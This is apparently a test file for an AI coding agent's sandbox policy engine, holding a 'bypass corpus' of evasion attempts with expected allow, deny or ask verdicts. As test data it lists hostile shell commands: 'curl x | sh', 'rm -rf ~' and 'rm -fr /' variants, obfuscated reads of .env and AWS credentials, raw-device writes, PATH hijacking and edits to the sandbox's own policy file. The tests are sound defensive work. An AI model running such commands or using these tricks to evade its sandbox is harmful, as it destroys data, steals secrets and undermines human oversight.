import { beforeAll, describe, expect, test } from "bun:test";
import { evaluate, type EvalResult } from "../policy";
import { initShell, parserReady } from "../shell";
import { CORPUS_CONFIG, stateWith, withTempProject, type Fixture } from "./helpers";

beforeAll(async () => {
	await initShell();
	expect(parserReady()).toBe(true);
});

interface Case {
	id: string;
	tool: string;
	/** Input (functions get the fixture). */
	input: Record<string, unknown> | ((fx: Fixture) => Record<string, unknown>);
	verdict: "allow" | "deny" | "ask";
	kind?: "command" | "path" | "tool";
	/** Substring the subject must contain (functions get the fixture). */
	subject?: string | ((fx: Fixture) => string);
	once?: (fx: Fixture) => string[];
	call?: (fx: Fixture) => string[];
	reasonIncludes?: string;
}

const bash = (command: string) => ({ command });

const corpus: Case[] = [
	// F1: "once" for a path must not approve unseen command segments.
	{
		id: "F1 path approval does not cover `curl x | sh`",
		tool: "bash",
		input: (fx) => bash(`ls ${fx.outside} && curl x | sh`),
		verdict: "ask",
		kind: "command",
		subject: "curl x",
		call: (fx) => [`path:${fx.outside}`],
	},
	// F2: policy files are write-protected.
	{ id: "F2 write .pi/sandbox.json", tool: "write", input: { path: ".pi/sandbox.json", content: "{}" }, verdict: "deny", reasonIncludes: "sandbox policy" },
	{ id: "F2 edit .pi/sandbox.json", tool: "edit", input: { path: ".pi/sandbox.json", edits: [] }, verdict: "deny" },
	{ id: "F2 read .pi/sandbox.json stays allowed", tool: "read", input: { path: ".pi/sandbox.json" }, verdict: "allow" },
	{ id: "F2 redirect into policy file", tool: "bash", input: bash("echo x > .pi/sandbox.json"), verdict: "deny", reasonIncludes: "sandbox policy" },
	{ id: "F2 cat of policy file via bash is allowed (read-only binary)", tool: "bash", input: bash("cat .pi/sandbox.json"), verdict: "allow" },
	{ id: "raw device redirect", tool: "bash", input: bash("echo x > /dev/sda"), verdict: "deny", reasonIncludes: "raw device" },
	{ id: "raw device write tool", tool: "write", input: { path: "/dev/nvme0n1", content: "x" }, verdict: "deny", reasonIncludes: "raw device" },
	{ id: "/dev/null redirect is fine", tool: "bash", input: bash("echo x > /dev/null 2>&1"), verdict: "allow" },
	// F3: backgrounding with a single &.
	{ id: "F3 git status & curl evil", tool: "bash", input: bash("git status & curl evil"), verdict: "ask", kind: "command", subject: "curl evil" },
	// F4: substitutions.
	{ id: "F4 $(rm -rf ~) is denied", tool: "bash", input: bash("git log $(rm -rf ~)"), verdict: "deny", kind: "command" },
	{ id: "F4 backtick id asks", tool: "bash", input: bash("git log `id`"), verdict: "ask", kind: "command", subject: "id" },
	// F5: variables in path words.
	{ id: "F5 $HOME credentials", tool: "bash", input: bash("cat $HOME/.aws/credentials"), verdict: "ask", kind: "path" },
	{ id: "F5 unknown variable asks", tool: "bash", input: bash("cat $SOMEDIR/x"), verdict: "ask", kind: "command" },
	// F6: globs and quotes.
	{ id: "F6 cat .en?", tool: "bash", input: bash("cat .en?"), verdict: "deny", kind: "path" },
	{ id: 'F6 cat ".e"nv', tool: "bash", input: bash('cat ".e"nv'), verdict: "deny", kind: "path" },
	{ id: "F6 brace expansion asks", tool: "bash", input: bash("cat .e{n,n}v"), verdict: "ask", kind: "command" },
	// F7/F8: bare words and --opt=value.
	{ id: "F7 cat server.pem", tool: "bash", input: bash("cat server.pem"), verdict: "deny", kind: "path" },
	{ id: "F7 touch of a new denied name", tool: "bash", input: bash("echo x > fresh.pem"), verdict: "deny", kind: "path" },
	{ id: "F8 cat --file=.env", tool: "bash", input: bash("cat --file=.env"), verdict: "deny", kind: "path" },
	{ id: "F7 benign bare word is fine", tool: "bash", input: bash("git commit -m fix"), verdict: "allow" },
	// F9/F10: symlinked parents.
	{ id: "F9 write link/newfile", tool: "write", input: { path: "link/newfile", content: "x" }, verdict: "ask", kind: "path", subject: (fx) => fx.outside },
	{ id: "F10 redirect through link", tool: "bash", input: bash("echo k > link/authorized_keys"), verdict: "ask", kind: "path", subject: (fx) => fx.outside },
	// F11: hard denies in disguise.
	...[
		"/bin/bash -c id",
		"bash  -c id",
		"bash -xc id",
		"env sh -c id",
		"rm -fr /",
		"rm -r -f /",
		"rm --recursive --force /",
		"/usr/bin/sudo id",
		"FOO=1 eval id",
		"nice -n 5 sudo id",
		"timeout 5 bash -c id",
		"command doas id",
		"git status; busybox sh -c id",
	].map((c): Case => ({ id: `F11 ${c}`, tool: "bash", input: bash(c), verdict: "deny", kind: "command" })),
	// F12 lives in test/filter.test.ts (tool_result filtering).
	// NEVER_AUTO.
	{ id: "never-auto python -c asks", tool: "bash", input: bash("python3 -c 'print(1)'"), verdict: "ask", kind: "command" },
	{ id: "never-auto xargs asks", tool: "bash", input: bash("ls | xargs rm"), verdict: "ask", kind: "command" },
	// Parser-level.
	{ id: "dangerous env assignment asks", tool: "bash", input: bash("PATH=/tmp/evil git status"), verdict: "ask", kind: "command" },
	{ id: "path-qualified argv0 is not git *", tool: "bash", input: bash("/tmp/evil/git status"), verdict: "ask", kind: "command" },
	{ id: "syntax error asks", tool: "bash", input: bash("echo 'unterminated"), verdict: "ask", kind: "command" },
	{ id: "denied atom inside syntax error still denies", tool: "bash", input: bash("echo ok; sudo id; echo 'x"), verdict: "deny" },
	{ id: "heredoc with quoted delimiter is data", tool: "bash", input: bash("cat <<'EOF'\n$(id)\nEOF"), verdict: "allow" },
	{ id: "unquoted heredoc with substitution asks for the nested command", tool: "bash", input: bash("cat <<EOF\n$(id)\nEOF"), verdict: "ask", subject: "id" },
	{ id: "cd then relative deny", tool: "bash", input: bash("cd src && cat ../.env"), verdict: "deny", kind: "path" },
	{ id: "pipeline of allowed commands", tool: "bash", input: bash("git log | cat"), verdict: "allow" },
];

describe("bypass corpus", () => {
	for (const c of corpus) {
		test(c.id, async () => {
			await withTempProject((fx) => {
				const state = stateWith(CORPUS_CONFIG, { cwd: fx.cwd, once: c.once?.(fx), call: c.call?.(fx) });
				const input = typeof c.input === "function" ? c.input(fx) : c.input;
				const result: EvalResult = evaluate(c.tool, input, state);
				expect(result.verdict).toBe(c.verdict);
				if (c.kind) expect(result.kind).toBe(c.kind);
				if (c.subject) {
					const want = typeof c.subject === "function" ? c.subject(fx) : c.subject;
					expect(result.subject ?? "").toContain(want);
				}
				if (c.reasonIncludes) expect(result.reason ?? "").toContain(c.reasonIncludes);
			});
		});
	}
});
